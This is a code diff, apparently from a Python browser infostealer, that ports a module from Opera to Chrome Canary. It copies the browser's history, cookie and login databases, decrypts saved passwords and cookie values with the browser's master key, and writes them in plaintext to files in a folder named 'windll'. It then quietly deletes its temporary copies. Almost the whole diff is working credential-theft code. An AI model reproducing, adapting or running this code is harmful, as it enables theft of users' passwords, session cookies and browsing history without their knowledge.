@@ -29,7 +29,7 @@ def time(date):
 
 def get_master_key_chrome():
     try:
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome SxS\User Data\Local State', "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
         master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
@@ -45,20 +45,20 @@ def decrypt(buff, master_key):
         return "Can't decode"
 
 
-def Opera():
+def Chrome_SxS():
     try:
         path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
-        data_path = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
+        data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome SxS\User Data\Default"
         files = os.listdir(data_path)
         history_db = os.path.join(data_path, 'history')
-        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
-        c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyS.db')
+        c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\historyS.db')
         cursor = c.cursor()
         temp = []
-        with open(rf"{path}\windll\Browsers\Opera\history-opera.txt", "a", encoding="utf-8") as history:
+        with open(rf"{path}\windll\Browsers\Chrome_SxS\history-Chrome_SxS.txt", "a", encoding="utf-8") as history:
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                 result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
@@ -68,17 +68,20 @@ def Opera():
                 history.write(result)
             history.close()
         try:
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyS.db')
         except:
             pass
-    
+ 
+
         CookiesSQL = "SELECT * FROM cookies"
-        data_path = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
+        data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome SxS\User Data\Default\Network"
         files = os.listdir(data_path)
         history_db = os.path.join(data_path, 'Cookies')
-        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
-        c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
+        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesS.db')
+        #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
+        c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesS.db')
         cursor = c.cursor()
+        
         
         results = '[\n'
 
@@ -106,7 +109,7 @@ def Opera():
     },
             '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))
 
-        with open(rf"{path}\windll\Browsers\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{path}\windll\Browsers\Chrome_SxS\Cookies-Chrome_SxS.json", "a", encoding="utf-8") as cookies:
             results = results.replace('True', 'true')
             results = results.replace('False', 'false')
             results += '\n]'
@@ -114,7 +117,7 @@ def Opera():
 
         cookies.close()
         try:
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
+            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesS.db')
         except:
             pass
     except:
@@ -122,7 +125,7 @@ def Opera():
 
     try:
         def get_master_key():
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
+            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome SxS\User Data\Local State', "r", encoding='utf-8') as f:
                 local_state = f.read()
                 local_state = json.loads(local_state)
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
@@ -151,7 +154,7 @@ def Opera():
 
                 return "Chrome < 80"    
     except:
-        print('НЕту хрома')
+        print('No chrome')
 
 
 
@@ -160,9 +163,9 @@ def Opera():
 
     try:
         master_key = get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera Stable\Login Data'
-        shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db') 
-        conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome SxS\User Data\default\Login Data'
+        shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultS.db') 
+        conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultS.db')
         cursor = conn.cursor()
 
         
@@ -175,11 +178,11 @@ def Opera():
 
             alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
 
-            with open(rf'{path}\windll\Browsers\Opera\opera-passwords.txt', "a") as o:
+            with open(rf'{path}\windll\Browsers\Chrome_SxS\Chrome_SxS-passwords.txt', "a") as o:
                 o.write(alldatapass)
         try:
 
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultS.db')
         except:
             pass
     except:
